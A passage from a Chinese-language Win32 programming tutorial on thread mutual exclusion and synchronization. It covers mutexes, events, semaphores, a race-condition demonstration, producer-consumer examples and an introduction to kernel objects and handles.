CreateMutex(<span class="hljs-literal">NULL</span>, TRUE, <span class="hljs-string">&quot;XYZ&quot;</span>);<br>    <span class="hljs-comment">// 判断互斥体是否创建失败</span><br>    <span class="hljs-keyword">if</span> (cm != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">// 判断互斥体是否已经存在，如果存在则表示程序被多次打开</span><br>        <span class="hljs-keyword">if</span> (GetLastError() == ERROR_ALREADY_EXISTS) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;该程序已经开启了，请勿再次开启！&quot;</span>);<br>            getchar();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 等待互斥体状态发生变化，也就是有信号或为互斥体拥有者，获取令牌</span><br>            WaitForSingleObject(cm, INFINITE);<br>            <span class="hljs-comment">// 操作资源</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Process: A Thread: B -- %d \n&quot;</span>, i);<br>                Sleep(<span class="hljs-number">1000</span>);<br>            &#125;<br>            <span class="hljs-comment">// 释放令牌</span><br>            ReleaseMutex(cm);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateMutex 创建失败! 错误代码: %d\n&quot;</span>, GetLastError());<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-27_17-7-1.png" alt="images/download/attachments/12714992/image2021-5-27_17-7-1.png"></p><h4 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h4><p>事件本身也是一种内核对象，其也是是用来控制线程的。</p><p>创建事件使用函数<strong>CreateEvent</strong>，其语法格式如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">HANDLE CreateEvent(<br>  LPSECURITY_ATTRIBUTES lpEventAttributes, // SD 安全属性，包含安全描述符<br>  <span class="hljs-type">BOOL</span> bManualReset,                       // <span class="hljs-keyword">reset</span> <span class="hljs-keyword">type</span> 如果你希望当前事件类型是通知类型则写<span class="hljs-keyword">TRUE</span>，反之<span class="hljs-keyword">FALSE</span><br>  <span class="hljs-type">BOOL</span> bInitialState,                      // initial state 初始状态，决定创建出来时候是否有信号，有为<span class="hljs-keyword">TRUE</span>，没有为<span class="hljs-keyword">FALSE</span><br>  LPCTSTR lpName                           // <span class="hljs-keyword">object</span> <span class="hljs-type">name</span> 事件名字<br>);<br></code></pre></td></tr></table></figure><p>控制事件的函数只有一个</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">BOOL <span class="hljs-constructor">SetEvent(HANDLE <span class="hljs-params">hEvent</span>)</span>;       <span class="hljs-comment">//将对象设置为已通知</span><br></code></pre></td></tr></table></figure><p>使用完事件对象要养成关闭句柄的好习惯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">CloseHandle(hEvent);<br></code></pre></td></tr></table></figure><h4 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h4><p>创建信号量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE <span class="hljs-title function_">CreateSemaphore</span><span class="hljs-params">(</span><br><span class="hljs-params">LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, <span class="hljs-comment">//表示安全控制，一般直接传入NULL。</span></span><br><span class="hljs-params"></span><br><span class="hljs-params">LONG lInitialCount, <span class="hljs-comment">//表示初始资源数量。0时不发送信号</span></span><br><span class="hljs-params"></span><br><span class="hljs-params">LONG lMaximumCount, <span class="hljs-comment">//表示最大并发数量。lInitialCount&lt;=lMaximumCount</span></span><br><span class="hljs-params"></span><br><span class="hljs-params">LPCTSTR lpName <span class="hljs-comment">//表示信号量的名称，传入NULL表示匿名信号量</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>打开信号量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">HANDLE <span class="hljs-title function_">OpenSemaphore</span><span class="hljs-params">(</span><br><span class="hljs-params"></span><br><span class="hljs-params">  DWORD dwDesiredAccess, <span class="hljs-comment">// 访问权限</span></span><br><span class="hljs-params"></span><br><span class="hljs-params">  BOOL bInheritHandle, <span class="hljs-comment">// 句柄继承性</span></span><br><span class="hljs-params"></span><br><span class="hljs-params">  LPCTSTR lpName <span class="hljs-comment">// 名称，不同进程中的各线程可以通过名称来确保它们访问同一个信号量</span></span><br><span class="hljs-params"></span><br><span class="hljs-params">)</span>;<br><br></code></pre></td></tr></table></figure><p>增加信号量资源计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">ReleaseSemaphore</span><span class="hljs-params">(</span><br><span class="hljs-params"></span><br><span class="hljs-params">HANDLE hSemaphore, <span class="hljs-comment">//信号量的句柄</span></span><br><span class="hljs-params"></span><br><span class="hljs-params">LONG lReleaseCount, <span class="hljs-comment">//增加个数，必须大于0且不超过最大资源数量</span></span><br><span class="hljs-params"></span><br><span class="hljs-params">LPLONG lpPreviousCount <span class="hljs-comment">//当前资源数量的原始值，设为NULL表示不需要传出</span></span><br><span class="hljs-params"></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>销毁或清理信号量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">CloseHandle()<br></code></pre></td></tr></table></figure><h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p><strong>临界区与互斥体</strong></p><p>1、临界区只能用于进程内的线程互斥，性能较好.<br>2、互斥体属于内核对象，可以用于进程间的线程互斥，性能较差.<br>3、线程在没有正常退出互斥区而意外终结时，互斥体可以复位，但临界区不行.</p><p><strong>事件与信号量</strong></p><p>1、都是内核对象，使用完毕后应该关闭句柄.<br>2、信号量可以用于相当复杂的线程同步控制.</p><h3 id="线程互斥"><a href="#线程互斥" class="headerlink" title="线程互斥"></a>线程互斥</h3><p>线程互斥是指对于共享的进程系统资源，在各单个线程访问时的排它性；当有若干个线程都要使用某一共享资源时，任何时刻最多只允许一个线程去使用，其它要使用该资源的线程必须等待，直到占用资源者释放该资源。</p><h4 id="线程安全问题"><a href="#线程安全问题" class="headerlink" title="线程安全问题"></a>线程安全问题</h4><p>每个线程都有自己的栈，局部变量是存储在栈中的，这就意味着每个进程都会有一份自己的“句柄变量”（栈），如果线程仅仅使用自己的“局部变量”那就不存在线程安全问题，反之，<strong>如果多个线程共用一个全局变量呢</strong>？那么在什么情况下会有问题呢？<strong>那就是当多线程共用一个全局变量并对其进行修改时则存在安全问题</strong>，如果仅仅是读的话没有问题。</p><p>如下所示代码，我们写了一个线程函数，该函数的作用就是使用全局变量，模拟的功能就是售卖物品，全局变量countNumber表示该物品的总是，其值是10，而如果有多个地方（线程）去卖（使用）这个物品（全局变量），则会出现差错：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-type">int</span> countNumber = <span class="hljs-number">10</span>;<br>DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lpParameter)</span> &#123;<br>    <span class="hljs-keyword">while</span> (countNumber &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sell num: %d\n&quot;</span>, countNumber);<br>        <span class="hljs-comment">// 售出-1</span><br>        countNumber--;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Count: %d\n&quot;</span>, countNumber);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    HANDLE hThread;<br>    hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    HANDLE hThread1;<br>    hThread1 = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    CloseHandle(hThread);<br><br>    getchar();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如图，我们运行了代码，发现会出现重复售卖，并且到最后总数竟变成了-1：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-27_15-4-41.png" alt="images/download/attachments/12714992/image2021-5-27_15-4-41.png"></p><p>出现这样的问题其本质原因是什么呢？<strong>因为多线程在执行的时候是同步进行的，并不是按照顺序来，并且存在着对同一共享资源进行同时写或一读一写的情况，这造成了上面现象的发生</strong>。</p><p>想要解决线程安全问题，就需要引伸出一个概念：临界资源，<strong>临界资源表示对该资源的访问一次只能有一个线程；访问临界资源可以有多重形式，其中一种形式是临界区</strong>。</p><h3 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h3><p>线程同步是指线程之间所具有的一种制约关系，一个线程的执行依赖另一个线程的消息，当它没有得到另一个线程的消息时应等待，直到消息到达时才被唤醒；同步的前提是互斥，其次就是有序，<strong>互斥并不代表A线程访问临界资源后就一定是B线程再去访问，也有可能是A线程，这就是属于无序的状态</strong>，所以同步就是<strong>互斥加上有序</strong>。</p><p>线程同步主要靠WaitForSingleObject和WaitForMultipleObjects两个函数来完成。</p><h4 id="WaitForSingleObject-x2F-WaitForMultipleObjects"><a href="#WaitForSingleObject-x2F-WaitForMultipleObjects" class="headerlink" title="WaitForSingleObject&#x2F;WaitForMultipleObjects"></a>WaitForSingleObject&#x2F;WaitForMultipleObjects</h4><p>WaitForSingleObject函数用于等待<strong>一个内核对象（对内核对象的详细说明会在下一章中）</strong>状态发生变更，那也就是执行结束之后，才会继续向下执行，其语法格式如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">DWORD WaitForSingleObject(<br>  HANDLE hHandle,        // handle <span class="hljs-keyword">to</span> <span class="hljs-keyword">object</span> 句柄<br>  DWORD dwMilliseconds   // <span class="hljs-type">time</span>-<span class="hljs-keyword">out</span> <span class="hljs-type">interval</span> 等待超时时间（毫秒）<br>);<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-23_12-34-19.png" alt="images/download/attachments/12714992/image2021-5-23_12-34-19.png"></p><p>如果你想一直等待的话，可以将第二参数的值设置为<strong>INFINITE</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HANDLE hThread;<br>hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OK...&quot;</span>);<br></code></pre></td></tr></table></figure><p>WaitForMultipleObjects函数与WaitForSingleObject函数<strong>作用是一样</strong>的，只不过它可以等待<strong>多个内核对象的状态</strong>发生变更，其语法格式如下：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">DWORD WaitForMultipleObjects(<br>  DWORD nCount,             // number of handles in<span class="hljs-built_in"> array </span>内核对象的数量<br>  CONST HANDLE *lpHandles,  // object-handle<span class="hljs-built_in"> array </span>内核对象的句柄数组<br>  BOOL bWaitAll,            // wait option 等待模式<br>  DWORD dwMilliseconds      // time-out interval 等待超时时间（毫秒）<br>);<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-23_15-30-41.png" alt="images/download/attachments/12714992/image2021-5-23_15-30-41.png"></p><p>等待模式的值是布尔类型，一个是TRUE，一个是FALSE，TRUE就是等待所有对象的所有状态发生变更，FALSE则是等待任意一个对象的状态发生变更。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">HANDLE hThread[<span class="hljs-number">2</span>];<br>hThread[<span class="hljs-number">0</span>] = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>hThread[<span class="hljs-number">1</span>] = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>WaitForMultipleObjects(<span class="hljs-number">2</span>, hThread, <span class="hljs-literal">TRUE</span>, INFINITE);<br></code></pre></td></tr></table></figure><h3 id="生产者与消费者问题"><a href="#生产者与消费者问题" class="headerlink" title="生产者与消费者问题"></a>生产者与消费者问题</h3><p>想要证明事件和互斥体最本质的区别，我们可以使用生产者与消费者模型来举例子。</p><p>生产者消费者模式就是通过一个容器来解决生产者和消费者的强耦合（依赖性）问题。生产者和消费者彼此之间不直接通讯，而通过阻塞队列来进行通讯，所以生产者生产完数据之后不用等待消费者处理，直接扔给阻塞队列，消费者不找生产者要数据，而是直接从阻塞队列里取，阻塞队列就相当于一个缓冲区，平衡了生产者和消费者的处理能力。</p><p>我们就可以理解为生产者生产一个物品，将其放进容器里，然后消费者从容器中取物品进行消费，就这样“按部就班”下去…</p><h4 id="互斥体-1"><a href="#互斥体-1" class="headerlink" title="互斥体"></a>互斥体</h4><p>首先我们来写一段互斥体下的生产者与消费者的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-comment">// 容器</span><br><span class="hljs-type">int</span> container;<br><span class="hljs-comment">// 次数</span><br><span class="hljs-type">int</span> count = <span class="hljs-number">10</span>;<br><span class="hljs-comment">// 互斥体</span><br>HANDLE hMutex;<br><span class="hljs-comment">// 生产者</span><br>DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lpParameter)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) &#123;<br>        <span class="hljs-comment">// 等待互斥体，获取令牌</span><br>        WaitForSingleObject(hMutex, INFINITE);<br>        <span class="hljs-comment">// 获取当前进程ID</span><br>        <span class="hljs-type">int</span> threadId = GetCurrentThreadId();<br>        <span class="hljs-comment">// 生产存放进容器</span><br>        container = <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread: %d, Build: %d \n&quot;</span>, threadId, container);<br>        <span class="hljs-comment">// 释放令牌</span><br>        ReleaseMutex(hMutex);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 消费者</span><br>DWORD WINAPI <span class="hljs-title function_">ThreadProcB</span><span class="hljs-params">(LPVOID lpParameter)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) &#123;<br>        <span class="hljs-comment">// 等待互斥体，获取令牌</span><br>        WaitForSingleObject(hMutex, INFINITE);<br>        <span class="hljs-comment">// 获取当前进程ID</span><br>        <span class="hljs-type">int</span> threadId = GetCurrentThreadId();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread: %d, Consume: %d \n&quot;</span>, threadId, container);<br>        <span class="hljs-comment">// 消费</span><br>        container = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 释放令牌</span><br>        ReleaseMutex(hMutex);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    <span class="hljs-comment">// 创建互斥体</span><br>    hMutex = CreateMutex(<span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 创建2个线程</span><br>    HANDLE hThread[<span class="hljs-number">2</span>];<br>    hThread[<span class="hljs-number">0</span>] = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    hThread[<span class="hljs-number">1</span>] = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProcB, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    WaitForMultipleObjects(<span class="hljs-number">2</span>, hThread, TRUE, INFINITE);<br>    CloseHandle(hThread[<span class="hljs-number">0</span>]);<br>    CloseHandle(hThread[<span class="hljs-number">1</span>]);<br>    CloseHandle(hMutex);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果如下图所示：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-28_17-57-34.png" alt="images/download/attachments/12714992/image2021-5-28_17-57-34.png"></p><p>我们可以清晰的看见结果并不是我们想要的，生产一次消费一次的有序进行，甚至还出现了先消费后生产的情况，这个问题我们可以去修改代码解决：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-28_18-3-24.png" alt="images/download/attachments/12714992/image2021-5-28_18-3-24.png"></p><p>这样虽然看似解决了问题，但是实际上也同样会出现一种问题，那就是for循环执行了不止10次，这样会倒是过分的<strong>占用计算资源</strong>。</p><h4 id="事件-1"><a href="#事件-1" class="headerlink" title="事件"></a>事件</h4><p>我们使用事件的方式就可以更加完美的解决这一需求：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-comment">// 容器</span><br><span class="hljs-type">int</span> container = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 次数</span><br><span class="hljs-type">int</span> count = <span class="hljs-number">10</span>;<br><br><span class="hljs-comment">// 事件</span><br>HANDLE eventA;<br>HANDLE eventB;<br><br><span class="hljs-comment">// 生产者</span><br>DWORD WINAPI <span class="hljs-title function_">ThreadProc</span><span class="hljs-params">(LPVOID lpParameter)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) &#123;<br>        <span class="hljs-comment">// 等待事件，修改事件A状态</span><br>        WaitForSingleObject(eventA, INFINITE);<br>        <span class="hljs-comment">// 获取当前进程ID</span><br>        <span class="hljs-type">int</span> threadId = GetCurrentThreadId();<br>        <span class="hljs-comment">// 生产存放进容器</span><br>        container = <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread: %d, Build: %d \n&quot;</span>, threadId, container);<br>        <span class="hljs-comment">// 给eventB设置信号</span><br>        SetEvent(eventB);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 消费者</span><br>DWORD WINAPI <span class="hljs-title function_">ThreadProcB</span><span class="hljs-params">(LPVOID lpParameter)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) &#123;<br>        <span class="hljs-comment">// 等待事件，修改事件B状态</span><br>        WaitForSingleObject(eventB, INFINITE);<br>        <span class="hljs-comment">// 获取当前进程ID</span><br>        <span class="hljs-type">int</span> threadId = GetCurrentThreadId();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread: %d, Consume: %d \n&quot;</span>, threadId, container);<br>        <span class="hljs-comment">// 消费</span><br>        container = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 给eventA设置信号</span><br>        SetEvent(eventA);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    <span class="hljs-comment">// 创建事件</span><br>    <span class="hljs-comment">// 线程同步的前提是互斥</span><br>    <span class="hljs-comment">// 顺序按照先生产后消费，所以事件A设置信号，事件B需要通过生产者线程来设置信号</span><br>    eventA = CreateEvent(<span class="hljs-literal">NULL</span>, FALSE, TRUE, <span class="hljs-literal">NULL</span>);<br>    eventB = CreateEvent(<span class="hljs-literal">NULL</span>, FALSE, FALSE, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 创建2个线程</span><br>    HANDLE hThread[<span class="hljs-number">2</span>];<br>    hThread[<span class="hljs-number">0</span>] = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    hThread[<span class="hljs-number">1</span>] = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ThreadProcB, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    WaitForMultipleObjects(<span class="hljs-number">2</span>, hThread, TRUE, INFINITE);<br>    CloseHandle(hThread[<span class="hljs-number">0</span>]);<br>    CloseHandle(hThread[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">// 事件类型也是内核对象，所以也需要关闭句柄</span><br>    CloseHandle(eventA);<br>    CloseHandle(eventB);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果如下图：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-28_18-13-7.png" alt="images/download/attachments/12714992/image2021-5-28_18-13-7.png"></p><h1 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h1><p>在铺垫完上面的内容后，我们可以正式引入内核对象这一概念了。</p><p>进程、线程、文件、互斥体、事件等等在内核都有一个对应的结构体，这些结构体都由内核负责管理，所以我们都可以称之为内核对象（**当我们创建一个进程，在内核层（高2G）就会创建一个结构体EPROCESS…**）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-20_0-41-40.png" alt="images/download/attachments/12714992/image2021-5-20_0-41-40.png"></p><p>记不住没关系，我们可以在<strong>MSDN Library中搜索CloseHandle这个函数</strong>，它是用来关闭句柄的，暂时先不用管其原理，我们只要知道它所支持关闭就都是内核对象：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-20_0-46-21.png" alt="images/download/attachments/12714992/image2021-5-20_0-46-21.png"></p><h2 id="管理内核对象"><a href="#管理内核对象" class="headerlink" title="管理内核对象"></a>管理内核对象</h2><p>当我们使用如下图所示的函数创建时，会在内核层创建一个结构体，而我们该如何管理这些结构体呢？或者说如何使用这些结构体呢？一种方式是使用指针，亦即我们可以通过内核结构体地址来管理，但是这样做存在问题：<strong>应用层很有可能操作不当导致修改啦内核结构体的地址</strong>，我们写应用层代码都知道访问到一个不存在的内存地址就会报错，而如果访问到一个内核地址是错误的，微软系统下则直接会蓝屏。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-20_0-53-28.png" alt="images/download/attachments/12714992/image2021-5-20_0-53-28.png"></p><p>微软为了避免这种情况的发生，所以其不会讲内核结构体的地址暴露给应用层，也就是说没法通过这种方式来直接管理。</p><h2 id="句柄表"><a href="#句柄表" class="headerlink" 